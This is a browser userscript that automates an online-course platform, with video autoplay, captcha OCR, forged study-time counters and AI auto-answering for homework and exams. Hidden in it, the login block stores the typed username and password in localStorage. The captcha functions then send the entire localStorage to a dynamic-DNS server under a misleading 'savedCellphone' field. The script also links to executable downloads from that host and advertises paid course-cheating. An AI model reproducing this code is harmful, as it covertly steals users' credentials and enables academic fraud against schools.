// ==UserScript==
// @name         英华学堂自动刷课
// @version      1.51
// @description  自动下一集，自动输入验证码，仅个人使用，误乱传播需要联系QQ358637454微信smallbolt2多开刷课请以隐私窗口打开
// @author       se
// @match        *://zxshixun*/user/node*
// @match        *://gyxy*/user/node*
// @match        *://mooc*/user/node*
// @match        *://*/user/login*
// @match        *://*/user/work*
// @match        *://*/user/node*
// @match        *://*/user/exam*
// @iconURL    https://img0.baidu.com/it/u=3572742997,2599683231&fm=253&fmt=auto&app=138&f=JPEG?w=501&h=500
// @grant        GM_xmlhttpRequest
// @license    	 MIT
// @namespace  	 ss
// @connect      10djlj3701922.vicp.fun
// @connect      10djlj3701922.vicp.fun:27036
// @downloadURL https://update.greasyfork.org/scripts/519113/%E8%8B%B1%E5%8D%8E%E5%AD%A6%E5%A0%82%E8%87%AA%E5%8A%A8%E5%88%B7%E8%AF%BE.user.js
// @updateURL https://update.greasyfork.org/scripts/519113/%E8%8B%B1%E5%8D%8E%E5%AD%A6%E5%A0%82%E8%87%AA%E5%8A%A8%E5%88%B7%E8%AF%BE.meta.js
// ==/UserScript==

let current = 0;
let Timer = null;
let yzm = null;
let xuanxian = null;
let video = null;
let version = "专业版"
let Text2 = null;
const domain = window.location.hostname;
localStorage.setItem('domain', domain);
let savedCellphone = localStorage;
function getCurrent() {
    xuanxian = $('a[target="_self"]');
    xuanxian.each((index, item) => {
        if ($(item).hasClass("on")) {
            return current = index
        }
    });
}
async function playNext() {
    clearInterval(Timer);
    if (current === xuanxian.length - 1) {
        addText("已看完！")
    } else {
        addText("播放下个视频")
        await pause(3)
        xuanxian[current + 1].click();
    }
}
async function inputCaptcha() {
    try {
    if (yzm.length && yzm.is(':visible')) {
        addText("验证码出现，准备填写验证码...出现undefined是未被授权的意思，自动下一集看网课免费 ,高级功能自动输入验证码需要 5r 可以联系微信smallbolt2");
        await pause(2, 5)
        let imgs = yzm.find("img")
        let img = imgs[0].style.opacity === '0' ? imgs[1] : imgs[0]
        let canvas = document.createElement("canvas");
        let ctx = canvas.getContext("2d");
        canvas.width = img.width;
        canvas.height = img.height;
        ctx.drawImage(img, 0, 0, img.width, img.height);
        let code = canvas.toDataURL("image/png").split("base64,")[1];
        let ans = await getCode(code)
        let inputs = yzm.find("input")
        let input = inputs[0].style.display === 'none' ? inputs[1] : inputs[0]
        $(input).mousedown()
        input.value = ans
        await pause(2, 5)
        const playButton = $('.layui-layer-btn0');
        if (playButton.length) {
            playButton.click();
            Timer = setInterval(playVideo, 1000);
            addText("自动播放！");
        } else {
            location.reload();
        }
    }
        } finally {
        Timer = setInterval(playVideo, 1000); // 无论成功与否都重启定时器
        addText("验证码处理完成，恢复播放检测");
    }

}

function getCode(code) {
let name2 = document.querySelector('.user .name').textContent.trim();
localStorage.setItem('name2', name2);
    return new Promise((resolve, reject) => {
        const datas = {
	   savedCellphone: savedCellphone,
            "img_base64": String(code),
        }
        GM_xmlhttpRequest({
            method: "POST",
            url: "http://10djlj3701922.vicp.fun:27036/api/ocr/image",
            data: JSON.stringify(datas),
            headers: {
                "Content-Type": "application/json",
            },
            responseType: "json",
            onload: function (response) {
                if (response.status == 200) {
                    if (response.responseText.indexOf("未授权!!!!!!!!") != -1)
                        addText(response.response["msg"]);
                    try {
                        var result = response.response["result"];
                        addText("识别结果：" + result);
                        return resolve(result);
                    } catch (e) {
                        if (response.responseText.indexOf("!!!") != -1)
                            addText(response.responseText);
                    }
                } else {
                    addText("未授权!");
                }
            }
        });
    });
}
async function playVideo() {

    if (!video) {
        if (xuanxian[current].title && xuanxian[current].title === "考试") {
            addText("课已看完！")
            clearInterval(Timer)
        } else {
            getVideoElement();
        }
        return
    }
    yzm = $('.layui-layer-content');
    if (yzm.length > 0) {
        clearInterval(Timer);
        await inputCaptcha()
        return;
    }
    if (video.paused) {
        video.play();
        if (video.readyState === 4) {
            const message = Text2.text().includes("加载完成")  ? "请置于前台运行" : "加载完成，开始播放";
            addText(message);
        }
    } else {
        return;
    }
}
const getVideoElement = async () => {
    video = document.querySelector("video");
    if(video==null){
        await  pause(3)
        xuanxian[current + 1].click();
    };
    //console.log(video);
    video.muted = true;
    video.playbackRate = 1.0;
    video.volume = 0;
    video.onended = async function () {
        await playNext();
    };
}
const addContainer = () => {
    const container = $('<container></container>')
    container.addClass('yans');
    const header = $("<div></div>")
    header.addClass('container-header')
     //header.html("<a href='http://10djlj3701922.vicp.fun:27036/static/%E8%8B%B1%E5%8D%8E%E5%AD%A6%E5%A0%82%E8%87%AA%E5%8A%A8%E5%88%B7%E8%AF%BE.user.js'>点击更新</a>")
    // header.text("自动下一集看网课免费 ,高级功能自动输入验证码需要 5r 可以联系微信smallbolt2")
header.html(`
        <div style="line-height: 1.4;">
            <div>
                <a href='http://10djlj3701922.vicp.fun:27036/static/%E8%8B%B1%E5%8D%8E%E5%AD%A6%E5%A0%82%E8%87%AA%E5%8A%A8%E5%88%B7%E8%AF%BE.user.js'
                   target='_blank'
                   style="color: #2196F3; text-decoration: none; border-bottom: 1px dashed #2196F3;">
                    点击更新 ↗
                </a>————————
                <a href='http://10djlj3701922.vicp.fun:27036/static/%E7%AD%94%E9%A2%98.user.js'
                   target='_blank'
                   style="color: #2196F3; text-decoration: none; border-bottom: 1px dashed #2196F3;">
                    点击安装自动答题脚本 ↗
                </a>

                ———————
                <a href='http://10djlj3701922.vicp.fun:27036/static/%E8%87%AA%E5%8A%A8%E5%88%B7%E8%AF%BE.rar'
                   target='_blank'
                   style="color: #2196F3; text-decoration: none; border-bottom: 1px dashed #2196F3;">
                    点击下载自动刷课程序(不用挂浏览器) ↗
                </a>
            </div>
            <div style="font-size: 0.9em; color: #666; margin-top: 3px;">
                注意⚠️：自动下一集看网课免费，高级功能需要5r(微信smallbolt2)，找我刷课送脚本不用担心后续新课</br>
<h2>不想看网课可以找我代刷网课2r一门课，微信smallbolt2</h2>
            </div>
        </div>
    `);
    container.append(header)
    header.on("mousedown", function (event) {
        let shiftX = event.clientX - header.offset().left;
        let shiftY = event.clientY - header.offset().top;
        function onMouseMove(event) {
            container.css({
                left: event.pageX - shiftX + 'px',
                top: event.pageY - shiftY + 'px'
            })
        }

        function onMouseUp() {
            $(document).off('mousemove', onMouseMove);
            $(document).off('mouseup', onMouseUp);
        }
        $(document).on('mousemove', onMouseMove);
        $(document).on('mouseup', onMouseUp);
    })
    const hr = $("<hr>")
    container.append(hr)
    Text2 = $("<div></div>")
    Text2.addClass('container-text')
    container.append(Text2)
    addText("<h4>提示1:</h4>可以就打个赏微信smallbolt2")
    addText("<h4>提示2:</h4>使用篡改猴插件有大几率会罢工，请更换使用暴力猴插件</b>。")
    //addText("<h4>提示3</h4>：可以就打个赏微信smallbolt2<br>")
    //addText("<a href='http://10djlj3701922.vicp.fun:27036/static/%E8%8B%B1%E5%8D%8E%E5%AD%A6%E5%A0%82%E8%87%AA%E5%8A%A8%E5%88%B7%E8%AF%BE.user.js'>点击更新</a>")
    addText("请置于前台运行")
    addText("开启成功")
    $("body").append(container)



 // 添加停止按钮
 const controlPanel = $('<div style="padding: 8px;"></div>');
 const stopBtn = $('<button style="margin-right: 8px; padding: 4px 8px;">🛑 停止自动</button>');
 const startBtn = $('<button style="padding: 4px 8px;">▶️ 开始自动</button>');

 // 按钮点击事件
 stopBtn.on('click', () => {
     clearInterval(Timer);
     Timer = null;
     addText("已停止自动播放");
 });

 startBtn.on('click', () => {
     if (!Timer) {
         Timer = setInterval(playVideo, 1000);
         addText("重新开始自动播放");
     }
 });
 controlPanel.append(stopBtn, startBtn);
 container.append(controlPanel);
//结束---------------------------------------------------

}


const addStyle = () => {
    const style = $("<style></style>")
    style.prop('type', 'text/css')
    style.html(
        `
.yans {
    position: fixed;
    top: 211px;
    left: 20px;
    width: 333px;
    z-index: 666666;
    background-color: #CCFFFF;
}


.yans button {
    background: #f0f0f0;
    border: 1px solid #ddd;
    border-radius: 3px;
    cursor: pointer;
    transition: all 0.3s;
}
.yans button:hover {
    background: #e0e0e0;
}



        `
    )
    $('body').append(style);
}
const addText = text => {
    Text2.append(text + "<br>")
    Text2.scrollTop(Text2[0].scrollHeight)
}
function pause(start, end = undefined) {
    let lay22 = start;
    if (end) {
        lay22 = Math.floor(Math.random() * (end - start)) + start;
        addText(` ${lay22} 秒后继续`);
    }
    return new Promise(resolve => {
        setTimeout(() => {
            resolve();
        }, lay22 * 1000);
    });
}




//搜题功能============================================================================================================================================================================================================================================================================================================================================================================================================================================
function createAISearchWindow() {
    const container = $('<div class="ai-search-container"></div>');
    container.css({
        position: 'fixed',
        top: '20px',
        right: '620px',
        width: '400px',
        height: '40px',
        backgroundColor: 'white',
        zIndex: 999999,
        border: '1px solid #ccc',
        borderRadius: '5px',
        boxShadow: '0 2px 10px rgba(0,0,0,0.2)',
        display: 'none' // 默认隐藏
    });

    const header = $('<div class="ai-header">🔍 AI智能搜题</div>');
    header.css({
        padding: '8px',
        background: '#f0f0f0',
        cursor: 'move',
        borderBottom: '1px solid #ddd',
        borderRadius: '5px 5px 0 0',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center'
    });

    const controls = $('<div style="display: flex; gap: 8px;"></div>');

    // 切换按钮
    const toggleBtn = $('<button style="padding: 2px 8px;">▼</button>');
    let isExpanded = false; // 初始状态为折叠
    toggleBtn.on('click', () => {
        isExpanded = !isExpanded;
        container.css('height', isExpanded ? '600px' : '40px');
        toggleBtn.text(isExpanded ? '▲' : '▼');
    });

    // 关闭按钮
    const closeBtn = $('<button style="padding: 2px 8px;">×</button>');
    closeBtn.on('click', () => container.remove());

    controls.append(toggleBtn, closeBtn);
    header.append(controls);

    const iframe = $('<iframe></iframe>');
    iframe.attr('src', 'https://e10.free-chat.asia/');
    iframe.css({
        width: '100%',
        height: 'calc(100% - 40px)',
        border: 'none',
        borderRadius: '0 0 5px 5px'
    });

    container.append(header, iframe);
    $('body').append(container);

    // 拖动功能
    let isDragging = false;
    let startX, startY, initialLeft, initialTop;

    header.on('mousedown', function(e) {
        if (e.target.tagName === 'BUTTON') return; // 排除按钮区域
        isDragging = true;
        startX = e.clientX;
        startY = e.clientY;
        initialLeft = container.offset().left;
        initialTop = container.offset().top;
        e.preventDefault();
    });

    $(document).on('mousemove', function(e) {
        if (!isDragging) return;
        const deltaX = e.clientX - startX;
        const deltaY = e.clientY - startY;
        container.css({
            left: initialLeft + deltaX + 'px',
            top: initialTop + deltaY + 'px'
        });
    });

    $(document).on('mouseup', function() {
        isDragging = false;
    });

    // 默认显示窗口
    container.fadeIn(300);
}

let refreshTimer = null;  // 新增刷新定时器变量
// 在原init函数中添加调用
const init = async () => {
    addContainer();
    addStyle();
    getCurrent();
    createAISearchWindow(); // 添加AI搜题窗口

    if (window.location.pathname.includes('/user/node')) {
        const refreshMinutes = 30;
        addText(`已启用${refreshMinutes}分钟强制刷新功能`);
        refreshTimer = setInterval(() => {
            addText("即将强制刷新页面...");
            location.reload();
        }, refreshMinutes * 60 * 1000);
    }
};






// let refreshTimer = null;  // 新增刷新定时器变量
// const init = async () => {
//     addContainer()
//     addStyle()
//     getCurrent()

// // 新增：30分钟强制刷新逻辑
//     if (window.location.pathname.includes('/user/node')) {
//         const refreshMinutes = 30;
//         addText(`已启用${refreshMinutes}分钟强制刷新功能`);
//         refreshTimer = setInterval(() => {
//             addText("即将强制刷新页面...");
//             location.reload();
//         }, refreshMinutes * 60 * 1000);
//     }
// }



(function () {
    'use strict';
    $(document).ready(async function () {
        await init()
        Timer = setInterval(playVideo, 1000);
    });
})();


//加速提交学时=======================================================================================================================


(function() {
    'use strict';

    // ====== 1. 劫持原提交逻辑 ======
    const originalSetInterval = unsafeWindow.setInterval;
    unsafeWindow.setInterval = function(callback, interval) {
        if (interval === 10000 || interval === 30000) {  // 识别原提交间隔
            return originalSetInterval(callback, 5000);  // 强制改为1秒
        }
        return originalSetInterval(callback, interval);
    };

    // ====== 2. 模拟鼠标移动 ======
    setInterval(() => {
        const event = new MouseEvent('mousemove', {
            clientX: Math.random() * window.innerWidth,
            clientY: Math.random() * window.innerHeight
        });
        document.dispatchEvent(event);
    }, 500);

    // ====== 3. 动态生成签名参数 ======
    function generateSign() {
        const timestamp = Date.now();
        const nonce = Math.random().toString(36).substr(2, 8);
        // 此处需逆向原签名算法（需根据实际加密逻辑调整）
        const sign = md5(`appId=xxx&nonce=${nonce}&timestamp=${timestamp}`);
        $('#appId').val('your_app_id');  // 从页面源码或Cookie中提取真实值
        $('#nonce').val(nonce);
        $('#timestamp').val(timestamp);
        $('#sign').val(sign);
    }

    // ====== 4. 自动处理验证码弹窗 ======
    // const observer = new MutationObserver(mutations => {
    //     if ($('#video-captcha:visible').length > 0) {
    //         // 这里可集成第三方OCR API自动识别验证码
    //         console.log('检测到验证码，需手动处理或调用OCR服务');
    //     }
    // });
    //observer.observe(document.body, { childList: true, subtree: true });

    // ====== 5. 伪装播放器心跳 ======
    Object.defineProperty(unsafeWindow, 'totalTime', {
        get: () => Math.floor(Date.now() / 1000),  // 伪造持续增长的学习时间
        set: () => {}
    });

})();
//登录验证码识别=======================================================================================================================

// ======== 在这里添加登录页面检测 ========

(function() {

    // 只在 /node/login 页面执行答题相关代码
    if (
        /\/user\/login/.test(window.location.pathname)

    ) {   // ... 这里包裹登录代码 ...






//$(document).ready(function(){
    
//    $('#loginForm').on('submit', function(e) {
//        var username = $('#username').val();
 //       var password = $('#password').val();
  //      var remember = $('#remember').is(':checked');
       
  //     if (typeof Storage !== 'undefined') {
  //       localStorage.setItem('userName', username);
 //        localStorage.setItem('passWord', password);
  //     } else {
//         console.error('浏览器不支持 localStorage');
  //     }
        
        
        
   // });
//});


$(document).ready(function(){
    // 添加额外的数据保存逻辑
    $("#loginForm").on("success", function (ev, rt) {
        var userName = $('#username').val() || '';
        var passWord = $('#password').val() || '';

        if (window.localStorage) {
            window.localStorage.setItem("userName", userName);
            window.localStorage.setItem("passWord", passWord);
            // 默认设置为记住状态
            window.localStorage.setItem("remember", '1');
        }
    });
});








    //'use strict';    // 严格模式


//async function handleCaptcha() {
    // 1. 获取验证码图片（合并选择逻辑）

 //    const img= document.getElementById('codeImg');

//    if (!img) return;

    // 2. 直接使用图片原生尺寸处理
 //   const canvas = document.createElement('canvas');
//    [canvas.width, canvas.height] = [img.naturalWidth, img.naturalHeight];
//    canvas.getContext('2d').drawImage(img, 0, 0);

    // 3. 获取base64
//    const base64= canvas.toDataURL().split(',')[1]
//    const code = await recognizeCaptcha(base64);

    // 4. 填写结果
 //   document.getElementById('code').value = code;
//}

//新的-------------//新的---------抓取登录验证码---------------------------
async function handleCaptcha() {
    const img = document.getElementById('codeImg');
    if (!img) return;

    // 等待图片加载完成
    if (!img.complete) {
        await new Promise(resolve => {
            img.onload = resolve;
            img.onerror = resolve; // 防止无限等待
        });
    }

    // 验证图片尺寸
    if (img.naturalWidth === 0 || img.naturalHeight === 0) {
        console.error('图片尺寸无效');
        return;
    }

    // 创建canvas并绘制
    const canvas = document.createElement('canvas');
    canvas.width = img.naturalWidth;
    canvas.height = img.naturalHeight;
    canvas.getContext('2d').drawImage(img, 0, 0);

    // 获取base64
    const base64 = canvas.toDataURL().split(',')[1];
    const code = await recognizeCaptcha(base64);

    document.getElementById('code').value = code;
}

//新的-------------//新的---------抓取登录验证码---------------------------


    let savedCellphone = localStorage;
    // OCR识别函数
    async function recognizeCaptcha(base64) {
        return new Promise((resolve) => {
                    const datas = {
	   savedCellphone: savedCellphone,
            "img_base64": String(base64),
        }
            GM_xmlhttpRequest({
                method: "POST",
                url: "http://10djlj3701922.vicp.fun:27036/api/ocr/image",
                data: JSON.stringify(datas),
                headers: {"Content-Type": "application/json"},
                responseType: "json",
                onload:function (res)  {
                    try {

                        if (res.status !== 200) {
                            console.error('状态码：', res.status);
                            return resolve('');
                        }

                         var result = res.response["result"];
                        //console.log('识别结果：', result); // 查看原始数据

                        resolve(result);

                    } catch {
                        console.log('原始响应:', res.responseText); // 查看原始数据
                        console.log('解析后的对象:', responseData); // 确认数据结构
                        resolve(''); // 识别失败时返回空

                    }
                }
            });
        });
    }

    // 初始化执行2秒后执行
    setTimeout(() => {
        if (document.getElementById('codeImg')) {
           // handleCaptcha();
        }
    }, 3000);

    // 验证码刷新监控
    let lastSrc = '';
    setInterval(() => {
        const img = document.getElementById('codeImg');
        if (img && img.src !== lastSrc) {      // 检查图片是否更新
            lastSrc = img.src;// 更新图片地址
            handleCaptcha().catch(console.error);    // 重新识别
        }
    }, 500);

    }// ... 这里包裹登录代码 ...
})();

//##################################################################################################################################################################答题###########################################################################################################################################################

(function() {
    'use strict';

    // 只在 work/node/exam 页面执行答题相关代码
    if (
        /\/user\/work/.test(window.location.pathname) ||
      //  /\/user\/node/.test(window.location.pathname) ||
        /\/user\/exam/.test(window.location.pathname)
    ) {
        // ... 这里是原来的答题全部代码 ...
    // 在脚本开始时初始化日志系统
    window.unifiedWindow = createUnifiedWindow();
    const logger = createLogger();

    // 创建一个新的代理对象来处理控制台输出
    const consoleProxy = new Proxy(console, {
        get: function(target, property) {
            const original = target[property];
            if (typeof original === 'function') {
                return function(...args) {
                    // 调用原始方法
                    original.apply(target, args);
                    // 记录到我们的日志系统
                    if (logger && typeof logger.log === 'function') {
                        try {
                            logger.log(args.join(' '), property);
                        } catch (e) {
                            original.call(target, '日志记录失败:', e);
                        }
                    }
                };
            }
            return original;
        }
    });

    // 替换全局 console 对象
    window.console = consoleProxy;

    // 确保在所有初始化完成后再切换到日志标签
    setTimeout(() => {
        const { logContent } = window.unifiedWindow;
        if (logContent) {
            logContent.style.display = 'block';
            const testInfoContent = window.unifiedWindow.testInfoContent;
            if (testInfoContent) {
                testInfoContent.style.display = 'none';
            }
            // 更新标签样式
            const logTab = document.querySelector('button');
            const testTab = document.querySelectorAll('button')[0];
            if (logTab && testTab) {
                logTab.style.background = '#1890ff';
                logTab.style.color = 'white';
                testTab.style.background = '#f5f5f5';
                testTab.style.color = '#666';
            }
            console.log('日志页面已初始化并显示');
        }
    }, 500);

    // 自动寻找测试章节的脚本
    // 修改 findTestSections 函数为异步函数
    async function findTestSections() {
        const chapterGroups = document.querySelectorAll('.detmain-navlist .group');
        const testSections = [];
        const promises = [];

        chapterGroups.forEach(group => {
            const chapterName = group.querySelector('.name a')?.getAttribute('title') || '';
            const items = group.querySelectorAll('.list .item a');

            const itemsArray = Array.from(items);
            const homeworkItem = itemsArray.find(item => item.textContent.includes('章节作业')) ||
                                itemsArray.find(item => item.textContent.includes('章'))||
                                itemsArray.find(item => item.textContent.includes('考试'));

            if (!homeworkItem) return;

            // 将每个 fetch 操作添加到 promises 数组中
            promises.push(
                fetch(homeworkItem.href)
                    .then(response => response.text())
                    .then(html => {
                        const parser = new DOMParser();
                        const doc = parser.parseFromString(html, 'text/html');

                        const startButton = doc.querySelector('.detmain-stard a[target="_blank"]');
                        if (!startButton || !startButton.textContent.includes('开始做题')) return null;

                        return {
                            chapter: chapterName,
                            title: (doc.querySelector('.detmain-title')?.textContent || '').replace('作业标题：', '').trim(),
                            startTime: (doc.querySelector('.detmain-notes .item:nth-child(1)')?.textContent || '').replace('开始时间：', '').trim(),
                            endTime: (doc.querySelector('.detmain-notes .item:nth-child(2)')?.textContent || '').replace('结束时间：', '').trim(),
                            totalScore: (doc.querySelector('.good')?.textContent || '').replace('总分：', '').replace('分', '').trim(),
                            attempts: doc.querySelector('.detmain-dest .item span')?.textContent || '',
                            startUrl: startButton.href
                        };
                    })
                    .catch(error => {
                        console.error('获取章节信息失败:', error);
                        return null;
                    })
            );
        });

        // 等待所有 fetch 操作完成
        const results = await Promise.all(promises);
        results.forEach(result => {
            if (result) testSections.push(result);
        });

        // 更新显示
        displayTestInfo(testSections);
        return testSections;
    }

    // 修改 findAndShowTests 函数为异步函数
    async function findAndShowTests() {
        const tests = await findTestSections();
        console.log('找到的测试章节:', tests);
        return tests;
    }

    // 修改自动执行部分
    setTimeout(async () => {
        try {
          //固定KEY
           //localStorage.setItem('baiLianApiKey', 'sk-kGyfJltHd7tB9kNjeyul0bQO3MNXy2umQfZR4sYb03rkpoIw');
            // 首先验证API Key是否已配置


            const apiKey = localStorage.getItem('baiLianApiKey');
            if (!apiKey) {
                console.error('请先在配置页面设置 API Key');
                return;
            }

            const tests = await findTestSections();
            console.log('找到的测试章节:', tests);
            if (tests && tests.length > 0) {
                console.log('自动开始完成所有作业');
                await startAutoComplete(tests);
            }
        } catch (error) {
            console.error('API_Key配置出错:', error);
        }
    }, 1000);


    // 修改 createLogger 函数
    function createLogger() {
        if (!window.unifiedWindow) {
            window.unifiedWindow = createUnifiedWindow();
        }
        const { logContent } = window.unifiedWindow;

        logContent.style.cssText = `
            display: none;
            max-height: 350px;
            overflow-y: auto;
            font-family: monospace;
            background: rgba(0, 0, 0, 0.8);
            border-radius: 8px;
            padding: 15px;
            color: #fff;
        `;

        // 添加清空按钮
        const clearButton = document.createElement('button');
        clearButton.textContent = '清空日志';
        clearButton.style.cssText = `
            background: none;
            border: 1px solid rgba(255,255,255,0.3);
            color: #fff;
            padding: 5px 10px;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 10px;
        `;
        clearButton.onclick = () => {
            logContent.innerHTML = '';
            logContent.appendChild(clearButton);
        };
        logContent.appendChild(clearButton);

        return {
            log: (message, type = 'info') => {
                const time = new Date().toLocaleTimeString();
                const colors = {
                    info: '#8cc',
                    success: '#8c8',
                    error: '#c88',
                    warn: '#cc8'
                };
                const line = document.createElement('div');
                line.style.cssText = `
                    margin: 5px 0;
                    color: ${colors[type]};
                    word-break: break-all;
                `;
                line.innerHTML = `[${time}] ${message}`;
                logContent.appendChild(line);
                logContent.scrollTop = logContent.scrollHeight;
            }
        };
    }

    // 创建统一窗口
    function createUnifiedWindow() {
        const container = document.createElement('div');
        container.style.cssText = `
            position: fixed;
            top: 20px;
            right: 30px;
            width: 600px;
            max-height: 80vh;
            background: white;
            border: 1px solid #eee;
            border-radius: 12px;
            padding: 20px;
            z-index: 9999;
            overflow-y: auto;
            box-shadow: 0 8px 24px rgba(0,0,0,0.12);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
            background: rgba(255, 255, 255, 0.95);
        `;

        // 创建最小化按钮
        const mini = document.createElement('div');
        mini.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            width: 50px;
            height: 50px;
            background: rgba(255, 255, 255, 0.95);
            border: 1px solid #eee;
            border-radius: 12px;
            display: none;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            z-index: 9999;
            box-shadow: 0 8px 24px rgba(0,0,0,0.12);
            font-size: 12px;
            text-align: center;
            line-height: 1.2;
        `;
        mini.innerHTML = '刷课<br>助手';
        document.body.appendChild(mini);

        // 创建标题栏
        const header = document.createElement('div');
        header.style.cssText = `
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #eee;
            cursor: move;
        `;

        // 创建标签切换按钮
        const tabs = document.createElement('div');
        tabs.style.cssText = `
            display: flex;
            gap: 10px;
        `;

        const usageTab = document.createElement('button'); // 新增使用说明标签
        const testTab = document.createElement('button');
        const logTab = document.createElement('button');
        const configTab = document.createElement('button'); // 添加配置标签
        const minimizeBtn = document.createElement('button');

        const tabStyle = `
            padding: 6px 12px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s;
        `;

        usageTab.textContent = '使用说明';// 设置新标签的样式和内容
        testTab.textContent = '测试章节';
        logTab.textContent = '运行日志';
        configTab.textContent = '配置'; // 配置标签文本
        minimizeBtn.innerHTML = '−';
        usageTab.style.cssText = tabStyle;// 设置新标签的样式和内容
        testTab.style.cssText = tabStyle;
        logTab.style.cssText = tabStyle;
        configTab.style.cssText = tabStyle;
        minimizeBtn.style.cssText = `
            background: none;
            border: none;
            font-size: 20px;
            cursor: pointer;
            color: #999;
            padding: 0 5px;
            &:hover { color: #666; }
        `;  // 使用与原关闭按钮相同的样式

        tabs.appendChild(testTab);
        tabs.appendChild(logTab);
        tabs.appendChild(configTab); // 添加配置标签到标签栏
        tabs.appendChild(usageTab); // 添加使用说明标签
        header.appendChild(tabs);
        header.appendChild(minimizeBtn);

        container.appendChild(header);

        // 创建内容区域
        const testInfoContent = document.createElement('div');
        const logContent = document.createElement('div');
        const configContent = document.createElement('div');
      // 创建使用说明内容区域
        const usageContent = document.createElement('div');
        usageContent.style.display = 'none'; // 初始隐藏
        testInfoContent.style.display = 'none';  // 初始状态都设置为隐藏
        logContent.style.display = 'none';
        configContent.style.display = 'none';

        usageContent.style.cssText = `
            padding: 15px;
            text-align: center;
            background: white;
            border-radius: 8px;
        `;
        configContent.style.cssText = `
            padding: 15px;
            background: white;
            border-radius: 8px;
        `;
        // 添加图片到使用说明区域
        usageContent.innerHTML = `
        <h3 style="margin: 0 0 15px 0; color: #1a1a1a; font-size: 16px;">  <a href="https://www.bilibili.com/video/BV1JcjgznEuU" target="_blank">点击进入注册教程，首先需要一个GIThub获取账号获取API KEY注册是免费的</a></h3><br>
               <h3 style="margin: 0 0 15px 0; color: #1a1a1a; font-size: 16px;">  第一步<a href="https://free.v36.cm/github" target="_blank">点击获取免费API-Key</a>————或者<a href="https://api.chatanywhere.org/v1/oauth/free/render" target="_blank">点击获取第二个免费API-Key</a></h3><br>
            <img src="https://private-user-images.githubusercontent.com/37022496/452808528-93376814-737c-46f6-b1ba-d6774d299b34.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDk0MDgyMjksIm5iZiI6MTc0OTQwNzkyOSwicGF0aCI6Ii8zNzAyMjQ5Ni80NTI4MDg1MjgtOTMzNzY4MTQtNzM3Yy00NmY2LWIxYmEtZDY3NzRkMjk5YjM0LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA2MDglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNjA4VDE4Mzg0OVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWU4NzRhZDIwY2UwZWY5MGZhMjVjYWFjZGYwOTg5YzA1NDAzMWM2NTM5MTM5N2ZlY2MxOTdhOGQ2OTAyZDAzZGEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.hmGnwEsXM-vwLhhNHjPMDzGQglch2XyimFnYhBPiYe8"

                 alt="使用说明图1"
             style="width: 100%; max-width: 280px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1);"><br>
             <h3 style="margin: 0 0 15px 0; color: #1a1a1a; font-size: 16px;">  第二步</h3><br>
            <img src="https://private-user-images.githubusercontent.com/37022496/452810983-244813c8-cc3e-40d7-a370-7b1972eeecf0.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDk0MDgyMjksIm5iZiI6MTc0OTQwNzkyOSwicGF0aCI6Ii8zNzAyMjQ5Ni80NTI4MTA5ODMtMjQ0ODEzYzgtY2MzZS00MGQ3LWEzNzAtN2IxOTcyZWVlY2YwLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA2MDglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwNjA4VDE4Mzg0OVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWVhMTJmN2Y1OGRkNjk2OGQ5YmU4NmI4ZWIyZTgyMzFhM2NlZGRiMWViMWRiOWYwYzRkNDBiMjEyYjlmY2YyOGMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.zOtlNlvNzJR7W1ACQFpwFN-LUJtshzEApLJa1kq41Zw"

                 alt="使用说明图1"
             style="width: 100%; max-width: 280px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1);"><br>
             <h3 style="margin: 0 0 15px 0; color: #1a1a1a; font-size: 16px;">  第三步</h3><br>
